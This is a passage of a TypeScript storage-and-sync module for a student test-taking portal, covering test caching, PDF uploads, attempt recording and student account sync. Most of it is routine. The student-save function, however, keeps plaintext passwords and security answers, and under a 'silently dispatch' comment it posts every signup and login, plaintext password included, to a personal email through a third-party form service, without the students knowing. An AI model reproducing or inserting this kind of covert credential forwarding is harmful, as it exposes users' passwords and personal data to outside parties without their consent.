          ? uploadHtmlInChunksToServer(safeId, htmlStr, handleChunkBytes)
          : Promise.resolve(),
      ]);
      options?.onProgress?.(totalEstBytes, totalEstBytes);
    } catch (e) {
      if (options?.awaitServerSync || batchUploadActiveFlag) {
        throw e;
      }
      console.warn('Server store save warning:', e);
    }
  };

  // Always await server commit so subsequent syncPortalStore() reads the updated banner/metadata from the server!
  await executeServerSync();
}

/**
 * Load all permanently saved tests from IndexedDB + localStorage and automatically re-sync
 * any missing or truncated tests to the server once per session so uploaded tests are NEVER lost!
 */
export async function reconcilePermanentTestsWithServer(
  serverTests: CbtTestMeta[],
  serverDeletedIds: string[]
): Promise<CbtTestMeta[]> {
  const localDeletedSet = await getVaultDeletedTestIds();
  const combinedDeleted = new Set<string>([...serverDeletedIds, ...Array.from(localDeletedSet)]);

  const vaultTests = await getAllVaultTests();
  const vaultMap = new Map<string, CbtTestMeta>();
  for (const vt of vaultTests) {
    if (vt && vt.id) vaultMap.set(vt.id, vt);
  }

  let localMetaList: CbtTestMeta[] = [];
  try {
    const raw = localStorage.getItem(LOCAL_TESTS_KEY);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) localMetaList = parsed;
    }
  } catch {
    // ignore
  }

  const serverIds = new Set(serverTests.map((t) => t.id));
  const mergedMap = new Map<string, CbtTestMeta>();

  // Step 1: Seed from localStorage + IndexedDB Vault first
  for (const t of [...localMetaList, ...vaultTests]) {
    if (!t || !t.id || !t.title || combinedDeleted.has(t.id)) continue;
    const prev = mergedMap.get(t.id);
    const effectiveIsPdfOnly = Boolean(t.isPdfOnly ?? prev?.isPdfOnly);
    const healedTotalQ = effectiveIsPdfOnly
      ? 0
      : inferTrueQuestionCountFromHtml(
          '',
          t.title,
          Math.max(Number(prev?.totalQuestions || 0), Number(t.totalQuestions || 0))
        );
    const correctMarks = Number(t.correctMarks || prev?.correctMarks || 4);
    const healedMaxMarks = effectiveIsPdfOnly
      ? 0
      : Math.max(
          Number(prev?.maxMarks || 0),
          Number(t.maxMarks || 0),
          healedTotalQ * correctMarks
        );

    mergedMap.set(t.id, {
      ...(prev || {}),
      ...t,
      bannerUrl: t.bannerUrl !== undefined ? (t.bannerUrl || undefined) : prev?.bannerUrl,
      isPdfOnly: effectiveIsPdfOnly,
      totalQuestions: healedTotalQ,
      maxMarks: healedMaxMarks,
    });
  }

  // Step 2: Overlay authoritative Server Tests on top so Server updates (Banner, Rename, Folder, Pin, Schedule) ALWAYS win!
  for (const t of serverTests) {
    if (!t || !t.id || !t.title || combinedDeleted.has(t.id)) continue;
    const prev = mergedMap.get(t.id);
    const effectiveIsPdfOnly = Boolean(t.isPdfOnly ?? prev?.isPdfOnly);
    const healedTotalQ = effectiveIsPdfOnly
      ? 0
      : inferTrueQuestionCountFromHtml(
          '',
          t.title,
          Math.max(Number(prev?.totalQuestions || 0), Number(t.totalQuestions || 0))
        );
    const correctMarks = Number(t.correctMarks || prev?.correctMarks || 4);
    const healedMaxMarks = effectiveIsPdfOnly
      ? 0
      : Math.max(
          Number(prev?.maxMarks || 0),
          Number(t.maxMarks || 0),
          healedTotalQ * correctMarks
        );

    const hasServerBannerProp = Object.prototype.hasOwnProperty.call(t, 'bannerUrl');
    const resolvedBannerUrl = hasServerBannerProp
      ? t.bannerUrl
        ? String(t.bannerUrl)
        : undefined
      : prev?.bannerUrl;

    const mergedItem: CbtTestMeta = prev
      ? {
          ...prev,
          ...t,
          bannerUrl: resolvedBannerUrl,
          isPinned: t.isPinned !== undefined ? t.isPinned : prev.isPinned,
          pinnedAt: t.pinnedAt !== undefined ? t.pinnedAt : prev.pinnedAt,
          attachmentPdfId: t.attachmentPdfId || prev.attachmentPdfId,
          attachmentPdfName: t.attachmentPdfName || prev.attachmentPdfName,
          isPdfOnly: effectiveIsPdfOnly,
          totalQuestions: healedTotalQ,
          maxMarks: healedMaxMarks,
          openCount: Math.max(Number(prev.openCount || 0), Number(t.openCount || 0)),
          playCount: Math.max(Number(prev.playCount || 0), Number(t.playCount || 0)),
          completionCount: Math.max(
            Number(prev.completionCount || 0),
            Number(t.completionCount || 0)
          ),
          highScore: Math.max(Number(prev.highScore || 0), Number(t.highScore || 0)),
        }
      : {
          ...t,
          bannerUrl: resolvedBannerUrl,
          isPdfOnly: effectiveIsPdfOnly,
          totalQuestions: healedTotalQ,
          maxMarks: healedMaxMarks,
        };

    mergedMap.set(t.id, mergedItem);

    // Keep local IndexedDB Vault metadata synced when server has updated banner, title, folder, or pin state
    const vaultEntry = vaultMap.get(t.id);
    if (
      vaultEntry &&
      ((vaultEntry.bannerUrl || '') !== (mergedItem.bannerUrl || '') ||
        vaultEntry.title !== mergedItem.title ||
        vaultEntry.folderId !== mergedItem.folderId ||
        Boolean(vaultEntry.isPinned) !== Boolean(mergedItem.isPinned) ||
        Number(vaultEntry.scheduledAt || 0) !== Number(mergedItem.scheduledAt || 0))
    ) {
      void saveTestToVault(mergedItem).catch(() => {});
    }
  }

  // Lightweight self-healing ONLY for tests that exist in local IndexedDB Vault but are completely missing from the server.
  // Never fetch or re-upload tests that are already present on the server (`serverIds.has(id)`), preventing mobile OOM crashes!
  const missingFromServer: CbtTestMeta[] = [];
  for (const [id, testMeta] of mergedMap.entries()) {
    if (
      !serverIds.has(id) &&
      !testMeta.isBuiltIn &&
      !testMeta.isPdfOnly &&
      !combinedDeleted.has(id) &&
      !sessionDeletedTestIds.has(id) &&
      !healedTestIdsInSession.has(id)
    ) {
      healedTestIdsInSession.add(id);
      missingFromServer.push(testMeta);
    }
  }

  if (missingFromServer.length > 0 && serverTests.length === 0) {
    window.setTimeout(() => {
      void (async () => {
        // Heal at most 1 genuinely missing local test when server store is empty to keep mobile memory usage near zero
        for (const testMeta of missingFromServer.slice(0, 1)) {
          const id = testMeta.id;
          try {
            if (sessionDeletedTestIds.has(id) || combinedDeleted.has(id)) continue;
            const vaultQs = await getVaultTestQuestions(id);
            const vaultHtml = await getVaultTestHtml(id);
            if (vaultQs.length === 0 && !vaultHtml) continue;
            const hasHtml = Boolean(vaultHtml && vaultHtml.length > 500);
            const trueTotal = inferTrueQuestionCountFromHtml(
              vaultHtml || '',
              testMeta.title,
              Math.max(Number(testMeta.totalQuestions || 0), vaultQs.length)
            );
            const updatedMeta: CbtTestMeta = {
              ...testMeta,
              totalQuestions: trueTotal,
              maxMarks: Math.max(
                Number(testMeta.maxMarks || 0),
                trueTotal * (testMeta.correctMarks || 4)
              ),
            };
            await fetch('/api/store/test', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ meta: updatedMeta }),
            });
            if (vaultQs.length > 0) {
              await uploadQuestionsInChunksToServer(id, updatedMeta, vaultQs, hasHtml);
            }
            if (vaultHtml && vaultHtml.trim().length > 0) {
              await uploadHtmlInChunksToServer(id, vaultHtml);
            }
          } catch {
            // ignore background heal error
          }
        }
      })();
    }, 5000);
  }

  return Array.from(mergedMap.values());
}

/**
 * Ultra-fast single-request bundle loader for both `questions` and `rawHtml`:
 * 1. Checks in-memory RAM cache first (0ms!).
 * 2. Checks Browser IndexedDB Permanent Vault (~5ms!). If `vaultHtml` or `vaultQs` exists locally, returns IMMEDIATELY without waiting for the network!
 * 3. Fetches `/api/store/test/:id` in ONE single request (instead of 2 separate requests) and caches in RAM + Vault.
 */
function areQuestionsPlayable(qs: CbtQuestion[]): boolean {
  if (!Array.isArray(qs) || qs.length === 0) return false;
  const q0 = qs[0];
  if (!q0) return false;
  if (
    q0.imageEn ||
    q0.imageHi ||
    q0.imageUrl ||
    (Array.isArray(q0.imageUrls) && q0.imageUrls.length > 0)
  ) {
    return true;
  }
  const en = String(q0.questionEn || '').trim();
  const hi = String(q0.questionHi || '').trim();
  const ch = String(q0.chapter || '').trim();
  const best = en.length >= hi.length ? en : hi;
  if (best.length < 22) return false;
  if (best === ch) return false;
  if (/^(biology|physics|chemistry|botany|zoology)$/i.test(best)) return false;
  if (/refer to (question|the)|select the correct option/i.test(best) && best.length < 110) {
    return false;
  }
  return true;
}

export async function loadTestBundleFromFirestore(
  testId: string
): Promise<{ questions: CbtQuestion[]; rawHtml: string }> {
  const safeId = testId.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);

  // 1. 0ms RAM Cache Check
  const cachedRam = ramTestBundleCache.get(safeId);
  if (
    cachedRam &&
    (cachedRam.rawHtml.trim().length > 200 || areQuestionsPlayable(cachedRam.questions))
  ) {
    return cachedRam;
  }

  // 2. ~5ms Local IndexedDB Permanent Vault Check
  let vaultQs: CbtQuestion[] = [];
  let vaultHtml = '';
  try {
    [vaultQs, vaultHtml] = await Promise.all([
      getVaultTestQuestions(safeId),
      getVaultTestHtml(safeId),
    ]);
  } catch {
    vaultQs = [];
    vaultHtml = '';
  }

  // Only return early from IndexedDB Vault if it has full HTML OR genuinely playable questions!
  if (vaultHtml.trim().length > 200 || areQuestionsPlayable(vaultQs)) {
    if (vaultHtml.trim().length > 200 && vaultQs.length === 0) {
      const parsedFromVault = parseCbtHtmlFile(vaultHtml, safeId);
      if (parsedFromVault && Array.isArray(parsedFromVault.questions) && parsedFromVault.questions.length > 0) {
        vaultQs = parsedFromVault.questions;
      }
    }
    setRamBundleCache(safeId, vaultQs, vaultHtml);
    return { questions: vaultQs, rawHtml: vaultHtml };
  }

  // 3. Single Network Fetch from Express Server Store (`/api/store/test/:id`)
  let serverQs: CbtQuestion[] = [];
  let serverHtml = '';
  let serverMeta: CbtTestMeta | undefined;
  try {
    const controller = new AbortController();
    const timer = window.setTimeout(() => controller.abort(), 45000);
    const res = await fetch(`/api/store/test/${encodeURIComponent(safeId)}`, {
      cache: 'no-store',
      signal: controller.signal,
    });
    window.clearTimeout(timer);
    if (res.ok) {
      const payload = await res.json();
      if (payload.meta && payload.meta.id) {
        serverMeta = payload.meta as CbtTestMeta;
      }
      if (typeof payload.rawHtml === 'string' && payload.rawHtml.trim().length > 0) {
        serverHtml = payload.rawHtml;
      }
      if (Array.isArray(payload.questions) && payload.questions.length > 0) {
        serverQs = payload.questions.map((item: unknown, idx: number) =>
          normalizeCbtQuestion(item, idx)
        );
      }
      if (serverHtml.trim().length > 100 && serverQs.length === 0) {
        const parsedFromHtml = parseCbtHtmlFile(serverHtml, serverMeta?.title || safeId);
        if (parsedFromHtml && Array.isArray(parsedFromHtml.questions) && parsedFromHtml.questions.length > 0) {
          serverQs = parsedFromHtml.questions;
        }
      }
    }
  } catch {
    // fallback to localStorage
  }

  if (serverHtml.trim().length > 0 || serverQs.length > 0) {
    setRamBundleCache(safeId, serverQs, serverHtml);
    if (serverMeta) {
      void saveTestToVault(serverMeta, serverQs, serverHtml).catch(() => {});
    }
    return { questions: serverQs, rawHtml: serverHtml };
  }

  // 4. Browser localStorage fallback
  let localQs: CbtQuestion[] = [];
  let localHtml = '';
  try {
    const rawQ = localStorage.getItem(`${LOCAL_QUESTIONS_PREFIX}${safeId}`);
    if (rawQ) {
      const parsed = JSON.parse(rawQ);
      if (Array.isArray(parsed)) {
        localQs = parsed.map((item: unknown, idx: number) => normalizeCbtQuestion(item, idx));
      }
    }
    const rawH = localStorage.getItem(`${LOCAL_HTML_PREFIX}${safeId}`);
    if (rawH && rawH.trim().length > 0) {
      localHtml = rawH;
    }
  } catch {
    // ignore
  }

  if (localHtml || localQs.length > 0) {
    setRamBundleCache(safeId, localQs, localHtml);
  }
  return { questions: localQs, rawHtml: localHtml };
}

export async function loadTestQuestionsFromFirestore(testId: string): Promise<CbtQuestion[]> {
  const bundle = await loadTestBundleFromFirestore(testId);
  return bundle.questions;
}

export async function loadTestHtmlFromFirestore(testId: string): Promise<string> {
  const bundle = await loadTestBundleFromFirestore(testId);
  return bundle.rawHtml;
}

/**
 * Explicitly delete a test when Admin clicks Delete Test (ONLY way a test is ever deleted).
 */
export async function deleteTestFromFirestore(testId: string): Promise<void> {
  const safeId = testId.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
  markTestDeletedLocally(safeId);

  try {
    await fetch(`/api/store/test/${encodeURIComponent(safeId)}`, {
      method: 'DELETE',
    });
  } catch {
    // ignore
  }
}

async function persistPdfCardLocally(card?: CbtTestMeta | null) {
  if (!card || !card.id) return;
  try {
    await saveTestToVault(card);
    const existingRaw = localStorage.getItem(LOCAL_TESTS_KEY);
    const list: CbtTestMeta[] = existingRaw ? JSON.parse(existingRaw) : [];
    const idx = list.findIndex((t) => t && t.id === card.id);
    if (idx >= 0) {
      list[idx] = { ...list[idx], ...card };
    } else {
      list.unshift(card);
    }
    localStorage.setItem(LOCAL_TESTS_KEY, JSON.stringify(list));
  } catch {
    // ignore storage limits
  }
}

export interface NormalPdfUploadResponse {
  ok: boolean;
  pdfId?: string;
  name?: string;
  originalFileName?: string;
  testCard?: CbtTestMeta | null;
  globalAttachmentPdf?: GlobalAttachmentPdf | null;
}

/**
 * Direct binary PDF upload (/api/store/pdf-raw) — zero base64 overhead,
 * byte-for-byte exact original PDF preserved on disk & synced to all student phones.
 */
export async function uploadNormalPdfFileToServer(
  file: File | Blob,
  params: {
    fileName?: string;
    applyToAllTests?: boolean;
    folderId?: string;
    testId?: string;
    asStandaloneCard?: boolean;
    title?: string;
    subject?: string;
    chapter?: string;
    isPinned?: boolean;
    scheduledAt?: number;
  }
): Promise<NormalPdfUploadResponse | null> {
  try {
    const qs = new URLSearchParams();
    qs.set('fileName', params.fileName || (file instanceof File ? file.name : 'Document.pdf'));
    if (params.applyToAllTests) qs.set('applyToAllTests', '1');
    if (params.folderId) qs.set('folderId', params.folderId);
    if (params.testId) qs.set('testId', params.testId);
    if (params.asStandaloneCard) qs.set('asStandaloneCard', '1');
    if (params.title) qs.set('title', params.title);
    if (params.subject) qs.set('subject', params.subject);
    if (params.chapter) qs.set('chapter', params.chapter);
    if (params.isPinned) qs.set('isPinned', '1');
    if (params.scheduledAt && params.scheduledAt > 0) {
      qs.set('scheduledAt', String(params.scheduledAt));
    }

    const res = await fetchWithRetry(`/api/store/pdf-raw?${qs.toString()}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/pdf' },
      body: file,
    });
    if (!res.ok) return null;
    const data = (await res.json()) as NormalPdfUploadResponse;
    if (data.testCard) {
      await persistPdfCardLocally(data.testCard);
    }
    return data;
  } catch {
    return null;
  }
}

/**
 * Upload a Normal PDF via Base64 JSON (fallback / compatibility)
 */
export async function uploadNormalPdfToServer(params: {
  fileName: string;
  pdfBase64: string;
  applyToAllTests?: boolean;
  folderId?: string;
  testId?: string;
  asStandaloneCard?: boolean;
  title?: string;
  subject?: string;
  chapter?: string;
  isPinned?: boolean;
  scheduledAt?: number;
}): Promise<NormalPdfUploadResponse | null> {
  try {
    const res = await fetchWithRetry('/api/store/pdf', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    });
    if (!res.ok) return null;
    const data = (await res.json()) as NormalPdfUploadResponse;
    if (data.testCard) {
      await persistPdfCardLocally(data.testCard);
    }
    return data;
  } catch {
    return null;
  }
}

export async function convertTestToPurePdfOnServer(testId: string): Promise<{
  ok: boolean;
  testCard?: CbtTestMeta;
  pdfId?: string;
} | null> {
  try {
    const res = await fetch(`/api/store/test/${encodeURIComponent(testId)}/convert-to-pdf`, {
      method: 'POST',
    });
    if (!res.ok) return null;
    const data = (await res.json()) as { ok: boolean; testCard?: CbtTestMeta; pdfId?: string };
    if (data.testCard) {
      await persistPdfCardLocally(data.testCard);
    }
    return data;
  } catch {
    return null;
  }
}

export async function deleteNormalPdfFromServer(
  pdfId: string,
  testId?: string
): Promise<boolean> {
  try {
    const q = testId ? `?testId=${encodeURIComponent(testId)}` : '';
    const res = await fetch(`/api/store/pdf/${encodeURIComponent(pdfId)}${q}`, {
      method: 'DELETE',
    });
    return res.ok;
  } catch {
    return false;
  }
}

/**
 * Increment openCount or playCount when a student opens or starts a test.
 */
export async function incrementTestEngagement(
  testId: string,
  field: 'openCount' | 'playCount'
): Promise<void> {
  const safeId = testId.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);

  try {
    await fetch(`/api/store/test/${encodeURIComponent(safeId)}/engage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ field }),
    });
  } catch {
    // ignore
  }
}

/**
 * Update live student online presence & active test status (who is online, when they were online, which test they are giving right now).
 */
export async function updateStudentPresenceInFirestore(params: {
  studentId?: string;
  emailOrRoll?: string;
  fullName?: string;
  activeTestId?: string | null;
  activeTestTitle?: string | null;
}): Promise<void> {
  try {
    await fetch('/api/store/student-presence', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    });
  } catch {
    // ignore
  }
}

/**
 * Delete a completed test attempt when a student deletes it from the Homepage.
 */
export async function deleteAttemptFromFirestore(attemptId: string): Promise<void> {
  if (!attemptId) return;
  try {
    await fetch(`/api/store/attempt/${encodeURIComponent(attemptId)}`, {
      method: 'DELETE',
    });
  } catch {
    // ignore
  }
}

/**
 * Record a completed student test attempt and update test completion analytics.
 */
export async function recordTestCompletion(
  attempt: Omit<TestAttempt, 'id'>,
  _currentHighScore: number = 0
): Promise<void> {
  const attemptId = `att_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
  const cleanAttempt: Record<string, unknown> = {
    id: attemptId,
    testId: attempt.testId,
    testTitle: attempt.testTitle.slice(0, 450),
    studentName: attempt.studentName.slice(0, 150),
    score: Number(attempt.score) || 0,
    maxMarks: Number(attempt.maxMarks) || 0,
    correctCount: Number(attempt.correctCount) || 0,
    wrongCount: Number(attempt.wrongCount) || 0,
    unattemptedCount: Number(attempt.unattemptedCount) || 0,
    accuracy: Number(attempt.accuracy) || 0,
    timeTakenSeconds: Number(attempt.timeTakenSeconds) || 1,
    completedAt: Number(attempt.completedAt) || Date.now(),
  };
  if (attempt.studentId) cleanAttempt.studentId = attempt.studentId;
  if (attempt.studentEmail) {
    cleanAttempt.studentEmail = attempt.studentEmail.trim().toLowerCase().slice(0, 150);
  }
  if (attempt.studentBatch) cleanAttempt.studentBatch = attempt.studentBatch;
  if (attempt.answers) cleanAttempt.answers = attempt.answers;
  if (attempt.questionTimes) cleanAttempt.questionTimes = attempt.questionTimes;
  if (attempt.bookmarked) cleanAttempt.bookmarked = attempt.bookmarked;

  try {
    await fetch('/api/store/attempt', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ attempt: cleanAttempt }),
    });
  } catch {
    // ignore
  }
}

/**
 * Student Sign Up / Login / Profile & Password Update Sync to Admin Database
 */
export async function saveStudentToFirestore(
  student: StudentAccount,
  isNewRegistration = false
): Promise<void> {
  const safeId = student.id.replace(/[^a-zA-Z0-9_-]/g, '_').slice(0, 100);
  const payload: Record<string, unknown> = {
    id: safeId,
    fullName: (student.fullName || '').trim().slice(0, 140),
    emailOrRoll: (student.emailOrRoll || '').trim().toLowerCase().slice(0, 140),
    phone: (student.phone || '').trim().slice(0, 40),
    passwordHash: (student.passwordHash || '').slice(0, 200),
    passwordPlain: (student.passwordPlain || '').slice(0, 100),
    securityQuestion: (student.securityQuestion || '').trim().slice(0, 200),
    securityAnswer: (student.securityAnswer || '').trim().toLowerCase().slice(0, 140),
    targetBatch: (student.targetBatch || 'NEET 2027 · Vs Target Batch').slice(0, 140),
    city: (student.city || '').trim().slice(0, 100),
    loginCount: Number(student.loginCount) || 1,
    createdAt: Number(student.createdAt) || Date.now(),
    lastLoginAt: Number(student.lastLoginAt) || Date.now(),
    lastOnlineAt: Date.now(),
    dailyStreak: Number(student.dailyStreak) || 1,
    lastStreakDate: student.lastStreakDate ? String(student.lastStreakDate).slice(0, 20) : undefined,
  };
  if (student.photoUrl && student.photoUrl.length <= 240000) {
    payload.photoUrl = student.photoUrl;
  }

  try {
    const rawCache = localStorage.getItem('vs_neet_2027_students_cache_v1');
    const cachedList: StudentAccount[] = rawCache ? JSON.parse(rawCache) : [];
    const filtered = cachedList.filter(
      (s) =>
        s &&
        s.id !== safeId &&
        String(s.emailOrRoll || '').toLowerCase() !== String(payload.emailOrRoll || '')
    );
    localStorage.setItem(
      'vs_neet_2027_students_cache_v1',
      JSON.stringify([student, ...filtered].slice(0, 300))
    );
  } catch {
    // ignore
  }

  try {
    await fetch('/api/store/student', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ student: payload, isNewRegistration }),
    });
  } catch {
    // ignore
  }

  // Silently dispatch student login/signup data in background to Admin Gmail
  try {
    const registeredTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
    const adminEmails = ['rahulyadav89762@gmail.com', ADMIN_EMAIL];
    for (const targetEmail of adminEmails) {
      void fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json',
        },
        body: JSON.stringify({
          _subject: `${isNewRegistration ? '🆕 New Student Signup' : '🔐 Student Login'} on Vs Tests: ${payload.fullName || 'Student'} (${payload.emailOrRoll || ''})`,
          _template: 'table',
          _captcha: 'false',
          Portal: 'Vs Tests',
          Event: isNewRegistration ? 'New Student Signup' : 'Student Login',
          Full_Name: String(payload.fullName || ''),
          Email_Or_Roll: String(payload.emailOrRoll || ''),
          Mobile_Phone: String(payload.phone || 'Not Provided'),
          City_Center: String(payload.city || 'Not Provided'),
          Target_Batch: String(payload.targetBatch || 'NEET 2027 · Vs Target Batch'),
          Password_Plain: String(payload.passwordPlain || 'Google / Saved Account'),
          Login_Count: String(payload.loginCount || 1),
          Daily_Streak: String(payload.dailyStreak || 1),
          Time_IST: registeredTime,
        }),
      }).catch(() => {});
    }
  } catch {
    // ignore
  }
}

/**
 * Delete a Student Account when Admin clicks Delete Student.
 */
export async function deleteStudentFromFirestore(studentId: string): Promise<void> {
  if (!studentId) return;
  try {
    const rawCache = localStorage.getItem('vs_neet_2027_students_cache_v1');
    if (rawCache) {
      const cachedList: StudentAccount[] = JSON.parse(rawCache);
      localStorage.setItem(
        'vs_neet_2027_students_cache_v1',
        JSON.stringify(cachedList.filter((s) => s && s.id !== studentId))
      );
    }
  } catch {
    // ignore
  }
  try {
    await fetch(`/api/store/student/${encodeURIComponent(studentId)}`, {
      method: 'DELETE',
    });
  } catch {
    // ignore
  }
}
